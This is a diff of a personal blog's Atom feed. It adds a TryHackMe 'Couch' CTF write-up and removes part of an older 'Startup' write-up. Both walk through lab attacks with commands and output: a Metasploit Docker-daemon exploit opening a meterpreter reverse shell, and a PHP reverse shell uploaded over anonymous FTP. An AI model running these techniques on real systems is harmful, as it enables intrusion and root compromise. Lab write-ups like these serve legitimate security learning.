@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
   <link href="https://darrynbrownfield.co.uk/tag/easy/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
-  <updated>2021-08-12T11:21:23+00:00</updated>
+  <updated>2021-08-13T15:50:26+00:00</updated>
   <id>https://darrynbrownfield.co.uk/tag/easy/feed.xml</id>
 
   
@@ -30,6 +30,296 @@
   
   
 
+  
+    <entry>
+      <title type="html">Couch Write Up</title>
+      <link href="https://darrynbrownfield.co.uk/couch" rel="alternate" type="text/html" title="Couch Write Up" />
+      <published>2021-08-13T00:00:00+00:00</published>
+      <updated>2021-08-13T00:00:00+00:00</updated>
+      <id>https://darrynbrownfield.co.uk/couch</id>
+      <content type="html" xml:base="https://darrynbrownfield.co.uk/couch">&lt;p&gt;&lt;img src=&quot;/assets/images/couch/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/couch&quot;&gt;couch&lt;/a&gt; is a easy rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://twitter.com/_stuxnet&quot;&gt;stuxnet&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;Although not required I added the machine IP to my host file so through out the write up I can use couch.thm for consistency. Once added I started a nmap scan to check for available ports.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial couch.thm
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-13 14:57 BST
+Nmap scan report for couch.thm (10.10.59.151)
+Host is up (0.034s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
+|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
+|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;1 Port open:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;22 - SSH - OpenSSH 7.2p2&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Unless its a bruce force challenge im not going to get far with just that so I also ran a full port scan and found 1 additional port:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -p- -oA nmap/allports couch.thm
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-13 14:58 BST
+Nmap scan report for couch.thm (10.10.59.151)
+Host is up (0.036s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5984/tcp open  couchdb
+
+Nmap done: 1 IP address (1 host up) scanned in 26.86 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I did a final scan using the two ports and ran the -sC &amp;amp; -sV flags to run default scripts and enumerate version.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -p 22,5984 -sC -sV -oA nmap/targeted couch.thm
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-13 14:59 BST
+Nmap scan report for couch.thm (10.10.59.151)
+Host is up (0.031s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
+|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
+|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
+5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
+|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;I had never heard of CouchDB so I opened up the web browser to ‘http://couch.thm:5984/’ and took a look.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Apache CouchDB is an open-source document-oriented NoSQL database, implemented in Erlang. CouchDB uses multiple formats and protocols to store, transfer, and process its data. It uses JSON to store data, JavaScript as its query language using MapReduce, and HTTP for an API.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/couch/index.png&quot; alt=&quot;index&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Before trying to exploit the service I wanted to understand how it works so I used google to find the &lt;a href=&quot;https://docs.couchdb.org/en/stable/intro/tour.html&quot;&gt;documentation&lt;/a&gt;. From reading the documentation I saw /utils/ provided a web interface.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/couch/adminpage.png&quot; alt=&quot;adminpage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With in the ‘secret’ folder I found a username and password.&lt;/p&gt;
+
+&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
+
+&lt;p&gt;The user credentials provided SSH access to the machine and the user.txt flag.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ssh atena@couch.thm
+atena@couch.thm's password: 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Last login: Fri Aug 13 07:12:25 2021 from &amp;lt;Machine IP&amp;gt;
+atena@ubuntu:~$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
+
+&lt;p&gt;While enumerating the machine I found two additional ports listening on the server 2375 and 38811.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;atena@ubuntu:~$ netstat -ano                                                                  
+Active Internet connections (servers and established)                                         
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer         
+tcp        0      0 0.0.0.0:5984            0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.1:2375          0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.1:38811         0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0    324 10.10.59.151:22         &amp;lt;Machine IP&amp;gt;:54352       ESTABLISHED on (0.07/0/0) 
+tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           off (0.00/0/0)
+udp        0      0 0.0.0.0:38711           0.0.0.0:*                           off (0.00/0/0)
+Active UNIX domain sockets (servers and established)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Also when I checked running processes using &lt;code class=&quot;highlighter-rouge&quot;&gt;ps aux&lt;/code&gt;, I found docker was running using one of the ports.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;root       813  0.0  6.5 524372 66484 ?        Ssl  06:52   0:01 /usr/bin/dockerd -H=fd:// -H=tcp://127.0.0.1:2375
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If you check the bash history, you can see the user has a ran a docker command to start a docker container. Using this technique you can start a container with the root file system mounted and grab any file you wish.&lt;/p&gt;
+
+&lt;p&gt;However, I wanted to do this one slightly differently. Imagine the user was unable to run docker commands, how else could we use the same technique? The below steps shows how to get the root flag by interacting directly with the service.&lt;/p&gt;
+
+&lt;p&gt;I wanted to be able to interact with the port easily so I used SSH local port forwarding. A great &lt;a href=&quot;https://linuxize.com/post/how-to-setup-ssh-tunneling/&quot;&gt;article&lt;/a&gt; explains how to do this.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ssh -L 2375:localhost:2375 atena@couch.thm                  
+                                                                  
+atena@couch.thm's password:                                       
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)
+                                                                  
+ * Documentation:  https://help.ubuntu.com                        
+ * Management:     https://landscape.canonical.com                
+ * Support:        https://ubuntu.com/advantage                   
+Last login: Fri Aug 13 07:12:49 2021 from &amp;lt;Machine IP&amp;gt;             
+atena@ubuntu:~$                                                   
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now I can interact with the port by going to ‘localhost:2375’. A great resource for tips and techniques is &lt;a href=&quot;https://book.hacktricks.xyz/pentesting/2375-pentesting-docker&quot;&gt;HackTricks&lt;/a&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Remote API is running by default on 2375 port when enabled. The service by default will not require authentication allowing an attacker to start a privileged docker container. By using the Remote API one can attach hosts / (root directory) to the container and read/write files of the host’s environment.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;If I had docker installed on my local machine I could use this to run docker commands on the remote service using the -H flag but I dont, we could also use CURL. However Metasploit is easier.&lt;/p&gt;
+
+&lt;p&gt;I fired up Metasploit and searched docker.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;msf6 &amp;gt; search docker
+
+Matching Modules
+================
+
+   #   Name                                                      Disclosure Date  Rank       Check  Description
+   -   ----                                                      ---------------  ----       -----  -----------
+   0   exploit/linux/http/dcos_marathon                          2017-03-03       excellent  Yes    DC/OS Marathon UI Docker Exploit
+   1   exploit/linux/local/docker_runc_escape                    2019-01-01       manual     No     Docker Container Escape Via runC Overwrite
+   2   exploit/linux/http/docker_daemon_tcp                      2017-07-25       excellent  Yes    Docker Daemon - Unprotected TCP Socket Exploit
+   3   exploit/linux/local/docker_daemon_privilege_escalation    2016-06-28       excellent  Yes    Docker Daemon Privilege Escalation
+   4   exploit/linux/local/docker_privileged_container_escape    2019-07-17       normal     Yes    Docker Privileged Container Escape
+   5   auxiliary/scanner/http/docker_version                                      normal     No     Docker Server Version Scanner
+   6   exploit/windows/local/docker_credential_wincred           2019-07-05       manual     Yes    Docker-Credential-Wincred.exe Privilege Escalation
+   7   exploit/multi/http/gitea_git_hooks_rce                    2020-10-07       excellent  Yes    Gitea Git Hooks Remote Code Execution
+   8   exploit/multi/http/gogs_git_hooks_rce                     2020-10-07       excellent  Yes    Gogs Git Hooks Remote Code Execution
+   9   post/linux/gather/enum_containers                                          normal     No     Linux Container Enumeration
+   10  post/linux/gather/checkcontainer                                           normal     No     Linux Gather Container Detection
+   11  auxiliary/admin/mssql/mssql_idf                                            normal     No     Microsoft SQL Server Interesting Data Finder
+   12  post/multi/gather/docker_creds                                             normal     No     Multi Gather Docker Credentials Collection
+   13  exploit/linux/http/rancher_server                         2017-07-27       excellent  Yes    Rancher Server - Docker Exploit
+   14  auxiliary/gather/saltstack_salt_root_key                  2020-04-30       normal     No     SaltStack Salt Master Server Root Key Disclosure
+   15  exploit/linux/misc/saltstack_salt_unauth_rce              2020-04-30       great      Yes    SaltStack Salt Master/Minion Unauthenticated RCE
+   16  exploit/linux/http/vmware_view_planner_4_6_uploadlog_rce  2021-03-02       excellent  Yes    VMware View Planner Unauthenticated Log File Upload RCE
+
+
+Interact with a module by name or index. For example info 16, use 16 or use exploit/linux/http/vmware_view_planner_4_6_uploadlog_rce
+
+msf6 &amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;‘exploit/linux/http/docker_daemon_tcp’ looks perfect.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;msf6 &amp;gt; use 2
+[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
+msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; set rhost localhost
+rhost =&amp;gt; localhost
+msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; set lhost tun0
+lhost =&amp;gt; tun0
+msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; show options
+
+Module options (exploit/linux/http/docker_daemon_tcp):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   CONTAINER_ID                   no        container id you would like
+   DOCKERIMAGE   alpine:latest    yes       hub.docker.com image to use
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS        localhost        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
+   RPORT         2375             yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  tun0             yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x64
+
+
+msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now I just run the exploit and get a shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; exploit
+[*] Exploiting target {:address=&amp;gt;&quot;0.0.0.1&quot;, :hostname=&amp;gt;&quot;localhost&quot;}
+
+[*] Started reverse TCP handler on &amp;lt;Machine IP&amp;gt;:4444 
+[-] Failed to connect to the target
+[-] Exploit aborted due to failure: unknown: Failed to connect to the target
+[*] Exploiting target {:address=&amp;gt;&quot;127.0.0.1&quot;, :hostname=&amp;gt;&quot;localhost&quot;}
+[*] Started reverse TCP handler on &amp;lt;Machine IP&amp;gt;:4444 
+[*] The docker container is created, waiting for deploy
+[*] Waiting for the cron job to run, can take up to 60 seconds
+[*] Sending stage (3012548 bytes) to 10.10.59.151
+[+] Deleted /etc/cron.d/GOKzWbNu
+[+] Deleted /tmp/nCJrYRbW
+[*] Meterpreter session 1 opened (&amp;lt;Machine IP&amp;gt;:4444 -&amp;gt; 10.10.59.151:41406) at 2021-08-13 16:39:05 +0100
+[*] Session 1 created in the background.
+msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; sessions 1
+[*] Starting interaction with 1...
+
+meterpreter &amp;gt; shell
+Process 18578 created.
+Channel 1 created.
+whoami
+root
+ls -lah /root/root.txt
+-rw-r--r-- 1 root root 26 Dec 18  2020 /root/root.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Darryn</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="tryhackme" />
+      
+        <category term="ctf" />
+      
+        <category term="easy" />
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
   
     <entry>
       <title type="html">Mustacchio Write Up</title>
@@ -3314,631 +3604,6 @@ Congratulations! You have successfully completed the challenge.
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Thats root! Thanks for reading!&lt;/p&gt;</content>
-
-      
-      
-      
-      
-      
-
-      <author>
-          <name>Darryn</name>
-        
-        
-      </author>
-
-      
-
-      
-        <category term="tryhackme" />
-      
-        <category term="ctf" />
-      
-        <category term="easy" />
-      
-
-      
-        <summary type="html"></summary>
-      
-
-      
-      
-    </entry>
-  
-    <entry>
-      <title type="html">Startup Write Up</title>
-      <link href="https://darrynbrownfield.co.uk/startup" rel="alternate" type="text/html" title="Startup Write Up" />
-      <published>2020-11-21T00:00:00+00:00</published>
-      <updated>2020-11-21T00:00:00+00:00</updated>
-      <id>https://darrynbrownfield.co.uk/startup</id>
-      <content type="html" xml:base="https://darrynbrownfield.co.uk/startup">&lt;p&gt;&lt;img src=&quot;/assets/images/startup/cover.jpg&quot; alt=&quot;Startup&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/startup&quot;&gt;Startup&lt;/a&gt; is an fun easy room from &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. Credit to &lt;a href=&quot;https://twitter.com/elbee_ez&quot;&gt;r1gormort1s&lt;/a&gt; for a great room.  We have three tasks to complete, finding both the user and root flag and the secret ingredient in the spicy soup recipe.&lt;/p&gt;
-
-&lt;p&gt;The description of the room is:&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (incase you get hungry), but that is not why you are here. To be truthful, we aren’t sure if our developers know what they are doing and our security concerns are rising. We ask that you preform a thorough penetration test and try to own root. Good luck!&lt;/em&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;p&gt;TryHackMe will assign a dynamic IP as part of the deployment, I’ve edited my /etc/hosts file with the name of the box and the assigned IP. I started by doing an nmap scan to check what ports are open.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
-└──╼ $sudo nmap -sC -sV -oN nmap/initial startup
-[sudo] password for daz: 
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-21 11:01 GMT
-Nmap scan report for startup (10.10.27.29)
-Host is up (0.026s latency).
-Not shown: 997 closed ports
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp [NSE: writeable]
-| -rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
-|_-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
-| ftp-syst: 
-|   STAT: 
-| FTP server status:
-|      Connected to (VPN IP)
-|      Logged in as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout in seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      At session startup, client count was 1
-|      vsFTPd 3.0.3 - secure, fast, stable
-|_End of status
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
-|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
-|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Maintenance
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 9.35 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;3 Ports open:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;21 - FTP - Anonymous login allowed which is interesting will need to check what files and access is available&lt;/li&gt;
-  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
-  &lt;li&gt;80 - HTTP - Apache web server&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
-
-&lt;p&gt;Starting with FTP (port 21) I logged in using anonymous as the username and password.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]                       
-└──╼ $ftp startup                                                    
-Connected to startup.                                                
-220 (vsFTPd 3.0.3)                                                   
-Name (startup:daz): anonymous                                        
-331 Please specify the password.                                     
-Password:                                                            
-230 Login successful.                                                
-Remote system type is UNIX.                                          
-Using binary mode to transfer files.
-ftp&amp;gt; ls 
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp
--rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
--rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
-226 Directory send OK.
-ftp&amp;gt; cd ftp
-250 Directory successfully changed.
-ftp&amp;gt; ls
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-226 Directory send OK.
-ftp&amp;gt; ls -lah
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 .
-drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 ..
-226 Directory send OK.
-ftp&amp;gt; get important.jpg 
-local: important.jpg remote: important.jpg
-200 PORT command successful. Consider using PASV.
-150 Opening BINARY mode data connection for important.jpg (251631 bytes)
-226 Transfer complete.
-251631 bytes received in 0.10 secs (2.3400 MB/s)
-ftp&amp;gt; get notice.txt 
-local: notice.txt remote: notice.txt
-200 PORT command successful. Consider using PASV.
-150 Opening BINARY mode data connection for notice.txt (208 bytes).
-226 Transfer complete.
-208 bytes received in 0.00 secs (4.1326 MB/s)
-ftp&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;A few files are available including a txt file stating someone is uploading Among Us memes. (I know nothing about Among Us but my kids say its good….. I prefer Assassins Creed!). We do have a possible username of Maya.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
-└──╼ $cat notice.txt 
-Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is
-, but Maya is looking pretty sus.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;But nothing else out of interest. So I turned my attention to HTTP (port 80).&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/startup/index.png&quot; alt=&quot;index&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;A very simple webpage and nothing really to note in the source.  So I ran a gobuster to check for other directories.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
-└──╼ $gobuster dir -u http://startup -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x txt,html
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://startup
-[+] Threads:        50
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Extensions:     txt,html
-[+] Timeout:        10s
-===============================================================
-2020/11/21 11:12:05 Starting gobuster
-===============================================================
-/files (Status: 301)
-/index.html (Status: 200)
-/server-status (Status: 403)
-===============================================================
-2020/11/21 11:22:32 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;‘/files’ looks interesting.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/startup/files.png&quot; alt=&quot;files&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This mirrors the files seen on the FTP service, so my first thought is to see if we can upload a reverse shell script via ftp and execute via the web.&lt;/p&gt;
-
-&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
-
-&lt;p&gt;The first step is to copy a web shell script in to our working directory.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
-└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php 
-┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
-└──╼ $mv php-reverse-shell.php shell.php
-┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
-└──╼ $
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I edited the script with my vpn IP and changed the port to 4444.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;set_time_limit (0);
-$VERSION = &quot;1.0&quot;;
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
-$chunk_size = 1400;
-$write_a = null;
-$error_a = null;
-$shell = 'uname -a; w; id; /bin/sh -i';
-$daemon = 0;
-$debug = 0;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Next I uploaded the script via ftp.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
-└──╼ $ftp startup
-Connected to startup.
-220 (vsFTPd 3.0.3)
-Name (startup:daz): anonymous
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp&amp;gt; put shell.php 
-local: shell.php remote: shell.php
-200 PORT command successful. Consider using PASV.
-553 Could not create file.
-ftp&amp;gt; cd ftp
-250 Directory successfully changed.
-ftp&amp;gt; put shell.php
-local: shell.php remote: shell.php
-200 PORT command successful. Consider using PASV.
-150 Ok to send data.
-226 Transfer complete.
-5493 bytes sent in 0.00 secs (168.9849 MB/s)
-ftp&amp;gt; exit
-221 Goodbye.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I was unable to add to the initial directory however once I changed to the ‘ftp’ directory I was able to successfully upload the web shell script. Now I just need to navigate to the file in my browser.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/startup/webshell.png&quot; alt=&quot;webshell&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;We have a shell!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
-└──╼ $nc -nvlp 4444
-listening on [any] 4444 ...
-connect to [(VPN IP)] from (UNKNOWN) [10.10.27.29] 48764
-Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
- 11:29:08 up 31 min,  0 users,  load average: 0.00, 1.01, 1.27
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We only have a limited shell as www-data so the next step is to enumerate the system to escalate privileges.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-$ ls -lah
-total 100K
-drwxr-xr-x  25 root     root     4.0K Nov 21 10:58 .
-drwxr-xr-x  25 root     root     4.0K Nov 21 10:58 ..
-drwxr-xr-x   2 root     root     4.0K Sep 25 08:12 bin
-drwxr-xr-x   3 root     root     4.0K Sep 25 08:12 boot
-drwxr-xr-x  16 root     root     3.5K Nov 21 10:58 dev
-drwxr-xr-x  96 root     root     4.0K Nov 12 05:08 etc
-drwxr-xr-x   3 root     root     4.0K Nov 12 04:53 home
-drwxr-xr-x   2 www-data www-data 4.0K Nov 12 04:53 incidents
-lrwxrwxrwx   1 root     root       33 Sep 25 08:12 initrd.img -&amp;gt; boot/initrd.img-4.4.0-190-generic
-lrwxrwxrwx   1 root     root       33 Sep 25 08:12 initrd.img.old -&amp;gt; boot/initrd.img-4.4.0-190-generic
-drwxr-xr-x  22 root     root     4.0K Sep 25 08:22 lib
-drwxr-xr-x   2 root     root     4.0K Sep 25 08:10 lib64
-drwx------   2 root     root      16K Sep 25 08:12 lost+found
-drwxr-xr-x   2 root     root     4.0K Sep 25 08:09 media
-drwxr-xr-x   2 root     root     4.0K Sep 25 08:09 mnt
-drwxr-xr-x   2 root     root     4.0K Sep 25 08:09 opt
-dr-xr-xr-x 127 root     root        0 Nov 21 10:57 proc
--rw-r--r--   1 www-data www-data  136 Nov 12 04:53 recipe.txt
-drwx------   4 root     root     4.0K Nov 12 04:54 root
-drwxr-xr-x  25 root     root      920 Nov 21 11:20 run
-drwxr-xr-x   2 root     root     4.0K Sep 25 08:22 sbin
-drwxr-xr-x   2 root     root     4.0K Nov 12 04:50 snap
-drwxr-xr-x   3 root     root     4.0K Nov 12 04:52 srv
